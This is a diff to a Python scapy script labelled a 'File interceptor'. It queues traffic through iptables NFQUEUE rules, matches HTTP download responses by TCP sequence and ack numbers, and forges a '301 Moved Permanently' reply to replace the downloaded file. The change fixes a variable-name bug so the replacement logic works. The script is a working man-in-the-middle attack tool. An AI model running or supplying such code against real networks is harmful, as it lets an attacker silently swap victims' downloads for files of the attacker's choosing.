@@ -2,14 +2,13 @@
 
 """
 File interceptor
+
 - # run iptables
 - iptables -I INPUT -j NFQUEUE --queue-num 0
 - iptables -I OUTPUT -j NFQUEUE --queue-num 0
 - # flush tables
 - iptables --flush
 
-- sport = source port
-- dport = destination port
 """
 
 import scapy.all as scapy
@@ -38,7 +37,7 @@ def process_packet(packet):
                 ACK_LIST.append(scapy_packet[scapy.TCP].ack)
         # sport = source port
         elif scapy_packet[scapy.TCP].sport == 80:
-            if scapy_packet[scapy.TCP].seq in ack_list:
+            if scapy_packet[scapy.TCP].seq in ACK_LIST:
                 ACK_LIST.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file")
                 dst_url = "HTTP/1.1 301 Moved Permanently\n" +
